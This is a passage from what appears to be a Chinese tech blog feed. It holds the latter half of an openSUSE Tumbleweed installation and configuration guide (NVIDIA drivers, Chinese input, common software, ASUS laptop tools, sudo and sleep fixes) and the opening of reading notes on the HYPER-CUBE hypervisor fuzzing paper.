进行安装，非常地舒适简便的同时也提供给我们许多可以客制化的地方</p><blockquote><p>和前面一样都是在虚拟机中重新截的图，因为笔者安装时忘了拍了：）</p></blockquote><p>惯例重启进入 UEFI 界面关闭安全启动将 U 盘设为第一个启动项进入 openSUSE Tumbleweed 的安装界面：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124003638.png"></p><blockquote><p>如果你是物理机安装而且没插网线会有一个额外的配置网络的环节，按照指引正常选择无线网卡连 WiFi 就行</p></blockquote><p>这里注意<strong>安装语言选择 English</strong>，因为自带的中文安装有些小问题（<a href="https://www.bilibili.com/video/BV1F7411G7jH/?t=2095">他们那个是有点差的.avi</a>），系统安装结束后我们再手动在系统中去安装中文相关的东西：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124004125.png"></p><p>Online Repositories 建议全选：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124004637.png"></p><p>桌面就按需选择了，笔者推荐选择 openSUSE 默认的 KDE Plasma ：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124005130.png"></p><p>硬盘分区的话笔者建议还是<strong>手动分区</strong>（选择下方的 <code>Expert Partitioner</code> 按钮中的 <code>Start with Existing Partitions</code>，之后直接选中对应硬盘并 <code>Add Partion...</code> 就会有非常细致的分区创建引导），因为他自动分区的逻辑有点怪怪的（之前自动分区差点把笔者原本的数据盘给抹了），主要是两个分区：</p><ul><li>EFI 分区（<code>EFI Boot Partion</code>，<strong>必须为 fat32 格式</strong>）：放 GRUB 和内核的地方，用来启动系统，需要挂载在 <code>/boot/efi</code> 下边</li><li>系统分区（<code>Operating System</code>，推荐还是 ext4，brtfs 强制重启容易炸）：系统基本环境，需要挂载在 <code>/</code> 下边</li></ul><blockquote><p>这里笔者<strong>不推荐和 Windows 混用同一个 EFI 分区</strong>，最好自己自立门户，一是 Win 原本的 EFI 分区实在太小随便塞点东西就爆了，二是独立分区干啥都方便不会影响到隔壁的 Win</p></blockquote><p>当然，也可以像笔者一样额外分一个分区做数据分区挂在 <code>/home</code> 下边，后面重装各种其他发行版都方便， <em>因为这里是虚拟机演示所以就只分了两个分区</em> ：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124005751.png"></p><p>时区设置和创建用户这种常规操作笔者就不截图了，最后来到安装前的最后确认环节，这里笔者建议把 Secure Boot 给关了，不然后面升级闭源显卡驱动可能会比较麻烦，<del>以及笔者觉得这个特性在个人电脑上完全没必要，真有人会来打吗</del></p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124010003.png"></p><p>安装好后会自动重启，这个时候默认进的就是 GRUB 界面了，可以选择进入 Windows 还是 Linux：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124013040.png"></p><p>这里不得不夸的一点是<strong>openSUSE 无缝地将笔者之前的 KDE 美化给迁移了过来</strong>（当笔者从 Arch 往 Fedora 上迁移时、重新安装 Fedora 时，这块都没太能处理好），把 <code>latte-dock</code> 给安装上之后笔者就像没换过系统一样：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/img_v3_025f_b217ee22-634c-432b-95ad-8c5569d0081g.jpg"></p><h1 id="0x03-安装-NVIDIA-Driver"><a href="#0x03-安装-NVIDIA-Driver" class="headerlink" title="0x03. 安装 NVIDIA Driver"></a>0x03. 安装 NVIDIA Driver</h1><p>openSUSE 默认不引入 non-OSS 软件，所以默认为 NVIDIA 显卡安装的是开源的 <code>nouveau</code> 驱动， <del>因为是社区逆向出来的所以不仅功能不全而且性能吊差</del> ，所以我们需要安装 NVIDIA 的官方驱动以获取更好的使用体验。</p><h3 id="闭源驱动（by-default）"><a href="#闭源驱动（by-default）" class="headerlink" title="闭源驱动（by default）"></a>闭源驱动（by default）</h3><blockquote><p>如果你用的是 A 卡或者仅有核显，则可以跳过这一章节</p></blockquote><p>YaST 是很好很强大的一个综合性工具，这也是 SUSE 系发行版的魅力之一，通过 YaST可以非常方便地管理包括软件安装在内的各项系统配置</p><p>首先用 zypper 引入 Nvidia 驱动仓库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper addrepo --refresh https://download.nvidia.com/opensuse/tumbleweed NVIDIA<br></code></pre></td></tr></table></figure><p>然后打开 <code>YaST-&gt;Software Management</code>，她会直接帮你选好需要安装的包，直接安就完事了：）</p><p>当然，你也可以手动进入 <code>YaST-&gt;Software Management-&gt;View-&gt;Repositories-&gt;NVIDIA</code> 选择要安装哪些包，一般来说最新的 NVIDIA 显卡直接选择最新的 <code>G06</code> 相关套件即可，其他的老显卡建议参考 <a href="https://en.opensuse.org/SDB:NVIDIA_drivers">openSUSE Wiki</a>，以笔者的电脑为例安装了以下这些包：</p><p><img src="https://s2.loli.net/2023/11/23/dbWQVyqU7Z1A9SN.png"></p><p>安装过程中 YaST 会自动帮你把 <code>nouveau</code> 给禁用了，完成之后直接重启，在终端输入 <code>nvidia-smi</code> 就可以看到显卡相关信息：</p><p><img src="https://s2.loli.net/2023/11/23/t9Qak3RJx7Yq4Xu.png" alt="image.png"></p><p>接下来更新 Grub 配置，不更新的话多重启几次可能桌面就会莫名其妙寄了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo vim /etc/default/grub<br></code></pre></td></tr></table></figure><p>在这个文件中找到 <code>GRUB_CMDLINE_LINUX</code> ，在其中加入如下内容：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">modprobe.<span class="hljs-attribute">blacklist</span>=nouveau rd.driver.<span class="hljs-attribute">blacklist</span>=nouveau nvidia-drm.<span class="hljs-attribute">modeset</span>=1<br></code></pre></td></tr></table></figure><p>应用新的 GRUB 配置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo grub2-mkconfig -o /boot/grub2/grub.cfg<br></code></pre></td></tr></table></figure><h3 id="开源驱动（only-for-RTX-2000-and-newer）"><a href="#开源驱动（only-for-RTX-2000-and-newer）" class="headerlink" title="开源驱动（only for RTX 2000 and newer）"></a>开源驱动（only for RTX 2000 and newer）</h3><p><del>可能是被 Linus 给 fuck 太多了，</del> NVIDIA <a href="https://developer.nvidia.com/blog/nvidia-releases-open-source-gpu-kernel-modules/">在 2022 年放出了开源的 Linux 内核模块</a>，为 Linuxer 们提供了除了闭源驱动以外的一个新的选择。</p><p>和安装闭源显卡驱动一样，首先用 zypper 引入 Nvidia 驱动仓库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper addrepo --refresh https://download.nvidia.com/opensuse/tumbleweed NVIDIA<br></code></pre></td></tr></table></figure><p>然后打开 <code>YaST-&gt;Software Management</code>，搜索 nvidia,勾上这两个带 <code>open</code> 字样的包之后让 YaST 帮你自动完成即可：</p><p><img src="https://s2.loli.net/2024/04/15/zOhtWciCZRmnLyS.png" alt="笔者这里是已经安装好了所以显示绿底打勾，如果是待安装则通常应当是一个蓝底白十字"></p><h1 id="0x04-安装中文与输入法"><a href="#0x04-安装中文与输入法" class="headerlink" title="0x04. 安装中文与输入法"></a>0x04. 安装中文与输入法</h1><p>openSUSE Tumbleweed 安装媒介中自带的中文有些问题，因此我们需要安装 English 系统后手动将中文给安装上</p><p>首先是将简体中文添加为第二语言（笔者不推荐作为第一语言，否则万一系统崩了以后进入 tty 抢救的时候会让你感到很崩溃），打开 <code>YaST-&gt;System-&gt;Language</code>，勾上 <code>Simplified Chinese</code> 后直接点 <code>OK</code> 就可以自动安装了：</p><p><img src="https://s2.loli.net/2023/11/23/pe6DK84kNB3cSZj.png" alt="image.png"></p><p>需要注意的是这里的进度条会莫名其妙变成负数，<strong>不影响正常安装</strong>，只是我们不能看到正确的进度罢了，慢慢等就行了：</p><p><img src="https://s2.loli.net/2023/11/23/AWh6xErjFi8XVTN.jpg"></p><p>完成中文的安装之后接下来我们来安装输入法，目前 Linux 下最火的中文输入法之一为 <code>fcitx</code>，直接通过 zypper 进行安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper in fcitx5 fcitx5-chinese-addons<br></code></pre></td></tr></table></figure><p>之后在设置里将 virtual keyboard 设为 fcitx5 并添加 input method <code>Pinyin</code> 即可：</p><p><img src="https://s2.loli.net/2023/11/23/MPsnu5im38qRI2G.png" alt="image.png"></p><h1 id="0x05-软件相关配置"><a href="#0x05-软件相关配置" class="headerlink" title="0x05. 软件相关配置"></a>0x05. 软件相关配置</h1><h3 id="常用软件安装"><a href="#常用软件安装" class="headerlink" title="常用软件安装"></a>常用软件安装</h3><p>比如说大家都喜欢的代码编辑器 <code>vscode</code> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo rpm --import https://packages.microsoft.com/keys/microsoft.asc<br>sudo zypper addrepo https://packages.microsoft.com/yumrepos/vscode vscode<br>sudo zypper refresh<br>sudo zypper install code<br></code></pre></td></tr></table></figure><p>Chrome 浏览器的安装需要借助 <a href="https://en.opensuse.org/SDB:OBS_Package_Installer">OPI</a>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper in opi<br>sudo opi chrome<br></code></pre></td></tr></table></figure><p>Docker 的安装直接按照 <a href="https://en.opensuse.org/Docker">wiki</a> 即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper install docker docker-compose docker-compose-switch<br>sudo systemctl enable docker<br>sudo usermod -G docker -a $USER # 将当前用户添加到 docker,后面就不用总是 sudo docker 了<br>sudo reboot # 重启就完事了<br></code></pre></td></tr></table></figure><p>openSUSE 是 RPM 系，因此大部分软件其实也可以直接将 rpm 包下载下来用 zypper 安装即可，以<a href="https://www.feishu.cn/download">飞书 Linux 版</a>为例：</p><p><img src="https://s2.loli.net/2023/11/23/3xMHfgpuzaDsXrQ.png" alt="image.png"></p><p>笔者在海外，有的时候会用到 Discord、Telegram 这样的软件，他们都是有 Linux 原生版本的（这里就不得不吐槽国内的一些软件迟迟不出 Linux 版了），直接用 zypper 安装即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper in discord telegram-desktop<br></code></pre></td></tr></table></figure><p>一些只有 Windows 版本的软件（例如微信）可以尝试用 <code>wine</code> 打开，使用 zypper 可以直接安装 <code>wine</code>，<code>winetricks</code> 则是用来进行功能补充的小工具：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper in wine winetricks<br></code></pre></td></tr></table></figure><h3 id="安装-Flatpak"><a href="#安装-Flatpak" class="headerlink" title="安装 Flatpak"></a>安装 Flatpak</h3><p>一些 openSUSE 没有的包也可以用 flatpak 从其他地方打过来：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper in flatpak<br>flatpak remote-add --user --if-not-exists flathub https://flathub.org/repo/flathub.flatpakrepo<br>flatpak update<br></code></pre></td></tr></table></figure><p>接下来让 flatpak 包的升级和 KDE&#x2F;Gnome 的 software update 无缝融合，首先创建 service：</p><blockquote><p>注：为了安全起见，这里我们采用用户级而非系统级配置</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl --user edit --full --force flatpak-user-update.service<br></code></pre></td></tr></table></figure><p>之后写入如下内容：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Unit]</span><br><span class="hljs-attr">Description</span>=Flatpak Automatic Update<br><span class="hljs-attr">Documentation</span>=man:flatpak(<span class="hljs-number">1</span>)<br><span class="hljs-attr">Wants</span>=network-<span class="hljs-literal">on</span>line.target<br><span class="hljs-attr">After</span>=network-<span class="hljs-literal">on</span>line.target<br><br><span class="hljs-section">[Service]</span><br><span class="hljs-attr">Type</span>=<span class="hljs-literal">on</span>eshot<br><span class="hljs-attr">ExecStart</span>=/usr/bin/flatpak --user uninstall --unused -y --noninteractive <span class="hljs-comment">; /usr/bin/flatpak --user update -y --noninteractive ; /usr/bin/flatpak --user repair</span><br></code></pre></td></tr></table></figure><p>然后用如下命令创建 timer：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl --user edit --full --force flatpak-user-update.timer<br></code></pre></td></tr></table></figure><p>之后加入如下内容：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Unit]</span><br><span class="hljs-attr">Description</span>=Flatpak Automatic Update Trigger<br><span class="hljs-attr">Documentation</span>=man:flatpak(<span class="hljs-number">1</span>)<br><br><span class="hljs-section">[Timer]</span><br><span class="hljs-attr">RandomizedDelaySec</span>=<span class="hljs-number">10</span>m<br><span class="hljs-attr">OnBootSec</span>=<span class="hljs-number">2</span>m<br><span class="hljs-attr">OnCalendar</span>=*-*-* <span class="hljs-number">4</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span><br><span class="hljs-attr">Persistent</span>=<span class="hljs-literal">true</span><br><br><span class="hljs-section">[Install]</span><br><span class="hljs-attr">WantedBy</span>=timers.target<br></code></pre></td></tr></table></figure><p>完成后启动 timer：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">systemctl --<span class="hljs-keyword">user</span> <span class="hljs-title">daemon-reload</span><br>systemctl --<span class="hljs-keyword">user</span> <span class="hljs-title">enable</span> --now flatpak-user-update.timer<br></code></pre></td></tr></table></figure><h3 id="配置-Wine"><a href="#配置-Wine" class="headerlink" title="配置 Wine"></a>配置 Wine</h3><p><strong>红酒</strong>（wine）是 Linux 下的一个 Win API 兼容层，实现了对绝大多数常见 Win API 的重写，利用 wine 我们可以在 Linux 下运行相当一部分 Windows 中的 EXE 程序</p><p>首先安装 wine 和 winetricks：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo zypper <span class="hljs-keyword">in</span> wine winetricks</span><br></code></pre></td></tr></table></figure><p>安装 fakechinese,解决部分程序的中文字体显示为方块字的问题：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">winetricks fakechinese</span><br></code></pre></td></tr></table></figure><p>大部分情况下<a href="https://github.com/vufa/deepin-wine-wechat-arch/issues/94">通用的解决方案</a>还是下载一份中文字体，例如微软雅黑，之后放到 <code>~/.wine/drive_c/windows/Fonts/</code> 下</p><h3 id="使用-openSUSE-Open-Builid-Service（OBS）"><a href="#使用-openSUSE-Open-Builid-Service（OBS）" class="headerlink" title="使用 openSUSE Open Builid Service（OBS）"></a>使用 openSUSE Open Builid Service（OBS）</h3><p>开放构建服务（Open Build Service</p><p>首先安装 osc：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo zypper <span class="hljs-keyword">in</span> osc</span><br></code></pre></td></tr></table></figure><h1 id="0x06-ASUS-Laptop-相关的一些配置"><a href="#0x06-ASUS-Laptop-相关的一些配置" class="headerlink" title="0x06. ASUS Laptop 相关的一些配置"></a>0x06. ASUS Laptop 相关的一些配置</h1><blockquote><p>如果你的电脑不是华硕笔记本，可以直接跳过这一部分</p></blockquote><p><a href="https://asus-linux.org/">ASUS Linux</a> 是一个为 ASUS Laptop 提供额外支持的民间社区，通过 <code>asusctl</code> 与 <code>supergfxctl</code> 这两个工具我们可以非常方便地配置笔记本的各种配置</p><p>首先引入 ASUS Linux 的仓库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper ar --priority 50 --refresh https://download.opensuse.org/repositories/home:/luke_nukem:/asus/openSUSE_Tumbleweed/ asus-linux<br></code></pre></td></tr></table></figure><p>安装 <code>asusctl</code>，并用 <code>power-profiles-daemon</code> 替换掉 <code>tlp</code> 作为默认的电源管理服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper rm tlp<br>sudo zypper in asusctl<br>sudo zypper in power-profiles-daemon<br>sudo systemctl enable --now power-profiles-daemon.service<br>sudo systemctl start asusd<br></code></pre></td></tr></table></figure><p>为了保养电池，可以用 <code>asusctl</code> 将最大充电限制在 80：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo asusctl -c 80<br></code></pre></td></tr></table></figure><p>然后安装 <code>supergfxctl</code> 用以管理显卡，并替换掉过时的 <code>suse-prime</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper rm suse-prime<br>sudo zypper in supergfxctl<br>sudo systemctl enable --now supergfxd<br></code></pre></td></tr></table></figure><p>例如外出时可以用 <code>supergfxctl</code> 切换到集显输出以省电：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo supergfxctl -s # 查看笔记本支持的视频输出模式<br>sudo supergfxctl -g # 查看当前的视频输出模式<br>sudo supergfxctl -m Integrated # 设置为集显输出<br>sudo supergfxctl -m Hybrid # 设置为混合输出<br></code></pre></td></tr></table></figure><blockquote><p>社区其实还提供了一个图形化配置界面 <code>asusctl-rog-gui</code>，不过其实功能都是一样的：）</p></blockquote><h1 id="0x07-个人配置优化"><a href="#0x07-个人配置优化" class="headerlink" title="0x07. 个人配置优化"></a>0x07. 个人配置优化</h1><h3 id="使用个人账户而非-root-进行特权操作"><a href="#使用个人账户而非-root-进行特权操作" class="headerlink" title="使用个人账户而非 root 进行特权操作"></a>使用个人账户而非 root 进行特权操作</h3><p>笔者个人以前的使用习惯是 root 账户和个人账户使用不同的密码，然后要进行特权操作都是以个人账户的身份 <code>sudo</code> 进行，但在 openSUSE 下默认会重定向到使用 root 账户：</p><p><img src="https://s2.loli.net/2024/07/03/fkyPXi243wSGB6I.png" alt="在 VM 新截的图"></p><blockquote><p>注：这也是 Linus 当年<a href="https://forums.opensuse.org/t/linus-on-opensuse/78107">舍弃 openSUSE 的原因</a>，这个非常规的权限管控理念确实有点谔谔</p></blockquote><p>解决方案是编辑 sudo 配置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">EDITOR=vim sudoedit /usr/etc/sudoers</span><br></code></pre></td></tr></table></figure><p>找到如下这一行，改成这样（去掉前面的 <code>#</code> 注释符）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sudo">## Uncomment to allow members of group wheel to execute any command<br>%wheel ALL=(ALL:ALL) ALL<br></code></pre></td></tr></table></figure><h3 id="单击选中而非打开"><a href="#单击选中而非打开" class="headerlink" title="单击选中而非打开"></a>单击选中而非打开</h3><p>KDE Dolphin 经典配置了，不过笔者更习惯 Windows 那样的单击选择双击打开的模式，这里只需要在系统设置中的 <code>Workspace Behaviour-&gt;General Behaviour</code> 中勾选 <code>Selects them</code> 即可</p><h3 id="笔记本盒盖行为优化"><a href="#笔记本盒盖行为优化" class="headerlink" title="笔记本盒盖行为优化"></a>笔记本盒盖行为优化</h3><p>KDE 桌面默认是盒盖后锁屏（Lock Screen），但是在 <code>System Setting-&gt;Hardware-&gt;Power Management</code> 中的 <code>Energy Saving</code> 中可以更改笔记本盒盖行为，常用的应该就是：</p><ul><li>Sleep：传统睡眠，保留内存和一些基本组建的供电</li><li>Hybrid Sleep：混合睡眠，简而言之就是数据留内存的同时写入硬盘，主要针对台式机可能会突发断电的情况</li><li>Hibernate：传统休眠，内存数据转存到硬盘上，电源关闭进入低功耗模式</li></ul><h1 id="0x08-一些问题解决"><a href="#0x08-一些问题解决" class="headerlink" title="0x08. 一些问题解决"></a>0x08. 一些问题解决</h1><h3 id="笔记本休眠-盒盖后无法唤醒"><a href="#笔记本休眠-盒盖后无法唤醒" class="headerlink" title="笔记本休眠&#x2F;盒盖后无法唤醒"></a>笔记本休眠&#x2F;盒盖后无法唤醒</h3><p>笔者这边看 journalctl 似乎是 N 卡的问题（ <del>so nvidia, fxck you!</del> ），在 <code>/etc/default/grub</code> 中的 <code>GRUB_CMD_LINUX</code> 中加入：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">acpi_rev_override</span>=1 <span class="hljs-attribute">acpi_osi</span>=Linux <span class="hljs-attribute">mem_sleep_default</span>=deep<br></code></pre></td></tr></table></figure><p>之后通过如下命令更新 grub 配置即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo grub2-mkconfig -o /boot/grub2/grub.cfg</span><br></code></pre></td></tr></table></figure><!--0x09. 使用 Docker 搭建深度学习环境 很多时候我们希望保证计算机主环境的整洁与完整性，毕竟万一某一天配各种软件把依赖给搞崩了就比较尴尬了，因此很多任务我们其实可以直接通过 Docker 来完成，虽然 openSUSE 自己也有深度学习框架，但是真用 openSUSE 来搞深度学习的终究是少数（国人就更少了），相对应地在网上的资料也比较少，因此我们这里选择使用 Ubuntu 镜像来搭建容器环境，毕竟搞机器学习的最重要的**就是那张卡**，而不是各种奇怪的系统环境-->]]></content>
    
    
    <summary type="html">&lt;p&gt;你说🉐对，但是 Arch Linux 是由 Arch 社区开发的一个 Linux 发行版…&lt;/p&gt;</summary>
    
    
    
    <category term="DISTRO" scheme="https://arttnba3.github.io/categories/DISTRO/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="openSUSE" scheme="https://arttnba3.github.io/tags/openSUSE/"/>
    
    <category term="openSUSE Tumbleweed" scheme="https://arttnba3.github.io/tags/openSUSE-Tumbleweed/"/>
    
  </entry>
  
  <entry>
    <title>【PAPER.0x04】论文笔记：HYPER-CUBE: High-Dimensional Hypervisor Fuzzing</title>
    <link href="https://arttnba3.github.io/2023/10/27/PAPER-0X04-HYPER_CUBE/"/>
    <id>https://arttnba3.github.io/2023/10/27/PAPER-0X04-HYPER_CUBE/</id>
    <published>2023-10-27T11:30:54.000Z</published>
    <updated>2024-07-31T09:43:19.242Z</updated>
    
    <content type="html"><![CDATA[<p>hyper 的 不是 visor，是我 cube 哒！</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>笔者最近刚好在弄虚拟化相关的工作（<del>本来以为从字节离职后就不会碰到和虚拟化相关的开发了</del>），而刚好笔者看到有一系列论文（还得是论文作者👍）给出了利用系统虚拟化技术来辅助漏洞挖掘以及针对虚拟化系统进行漏洞挖掘的好东西，因此笔者还是打算抽空浅读一下：）</p><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>虚拟机管理器（Virtual Machine Manager，VMM，aka Hypervisor）是云技术（尤其是 IaaS）的基石，因此其安全问题十分重要</p><p>本文给出 <code>Hyper-Cube</code> ——一个通用的对 hypervisor 进行 fuzzing 的工具</p><h1 id="0x01-Introduction"><a href="#0x01-Introduction" class="headerlink" title="0x01. Introduction"></a>0x01. Introduction</h1><blockquote><p><del>没必要讲但还是简单扯几句</del></p></blockquote><p>系统虚拟化技术是云计算的基石，但 VMM 若有漏洞则会影响到其他 VM 以及服务提供商的安全，因此我们需要一种高效的手段找出 VMM 中的漏洞</p><p>模糊测试（Fuzzing）是一个高效的找漏洞手段，但现在我们很难高效地 fuzz VMM：</p><ul><li>不同于传统 fuzz（只有 stdin 和 syscall 作为输入），fuzz VMM 需要与多种类型的接口 （MMIO、PIO、hypercall、…）进行交互</li><li>VMM crash 后的重启开销较大</li><li>很难高效地 fuzz（例如不能多线程）</li></ul><p>论文写作时（笔者注：2020年）最先进的 hypervisor fuzzer 是由 AFL 改来的 <a href="https://hhannuaa.github.io/papers/VDF_raid17.pdf">VDF</a>，只能 fuzz MMIO&#x2F;PIO；另一个 hypervisor fuzzer <a href="https://www.semanticscholar.org/paper/An-Empirical-Study-into-the-Security-Exposure-to-of-Ormandy/b67dc496b84010aa4f2a0f909fb3cb4d36ba78a0">IOFUZZ</a> 则只能往随机端口写随机值，<del>都弱爆了</del></p><p>为了解决这些挑战，本文给出三个可以提升的目标：</p><ul><li>较高的测试用例吞吐量</li><li>能同时与所有可用接口进行交互</li><li>能为一组不同的 hypervisor 生成稳定（stable）与确定（deterministic）的测试用例</li></ul><p>基于此，作者设计出了 <code>HYPER-CUBE</code>：一个基于一个最小客制化操作系统的通用 hypervisor fuzzer，总结下来贡献有如下三点：</p><ul><li>作者设计了一个多维度的（multi-dimentional）、无平台依赖的（platform-independent）能够有效且高效测试不同接口的模糊测试方法</li><li>作者描述了一个能够高效 fuzz hypervisor 的独立于待测平台的方法</li><li>作者通过一个名为 <code>HYPER-CUBE</code> 的客制操作系统实现了这种方法，并能在真实世界的 hypervisor 中找出漏洞</li></ul><p>项目代码开源于 <a href="https://github.com/RUB-SysSec/hypercube">https://github.com/RUB-SysSec/hypercube</a></p><h1 id="0x02-Technology-Background"><a href="#0x02-Technology-Background" class="headerlink" title="0x02. Technology Background"></a>0x02. Technology Background</h1><blockquote><p><del>感觉不如直接看<a href="https://arttnba3.cn/2022/08/29/VURTUALIZATION-0X02-BASIC_KNOWLEDGE/">系统虚拟化导论</a></del></p></blockquote><p>在开始之前先介绍 X86 虚拟化的一些基础知识、X86 中 OS 的启动过程、Guest OS 与 hypervisor 的通信接口</p><h2 id="A-x86-Boot-Process"><a href="#A-x86-Boot-Process" class="headerlink" title="A. x86 Boot Process"></a>A. x86 Boot Process</h2><p>在 x86 机器上最先运行的程序通常是 <code>Basic Input/Output System</code> （BIOS） 或 <code>Unified Extensible Firmware Interface</code> （UEFI），本文将这样的程序称为 <code>固件</code> （firmware），之后便是运行 boot loader （如 GRUB）来准备环境并引导操作系统内核，再由内核来配置其他硬件（如中断控制器、PCI 设备）</p><h2 id="B-Input-Output-on-x86"><a href="#B-Input-Output-on-x86" class="headerlink" title="B. Input&#x2F;Output on x86"></a>B. Input&#x2F;Output on x86</h2><p>x86 上与设备通信的方式有：</p><ul><li><code>Port I/O</code>：传统的端口地址总线，通过 <code>in</code>、<code>out</code> 指令访问</li><li><code>Memory-Mapped I/O</code>：外设寄存器&#x2F;内存被映射到物理地址总线上，从而可以通过传统内存访问方式进行访问</li><li><code>Direct Memory Access</code>：这种机制允许外设直接访问物理内存，本文主要关注 PCI&#x2F;PCIe DMA，而非 ISA DMA（因为难搞）</li></ul><p>表 1 给出接口总览：</p><p><img src="https://s2.loli.net/2023/10/21/1h6xUYOkTNiBVgl.png" alt="TABLE I: Overview of hypervisor attack surfaces."></p><h2 id="C-Hypervisor"><a href="#C-Hypervisor" class="headerlink" title="C. Hypervisor"></a>C. Hypervisor</h2><p>Hypervisor 为 VM 提供可控的虚拟环境（虚拟 CPU、虚拟内存、模拟中断），当 VM 需要进行特权操作时便会触发 <code>VM-Exit</code> 将控制权返还给 hypervisor，由其完成模拟操作后返还控制权——称为 <code>Trap and Emulate</code> 机制</p><p>通过提供完全虚拟化的环境，hypervisor 可以在物理机上同时运行多个 VM</p><h3 id="1-CPU-and-Memory-Virtualization"><a href="#1-CPU-and-Memory-Virtualization" class="headerlink" title="1) CPU and Memory Virtualization"></a>1) CPU and Memory Virtualization</h3><p>过去人们用 <em>二进制转译</em> （binary translation）技术实现完全的 CPU 与内存虚拟化，通过 <code>trap and emulate</code> 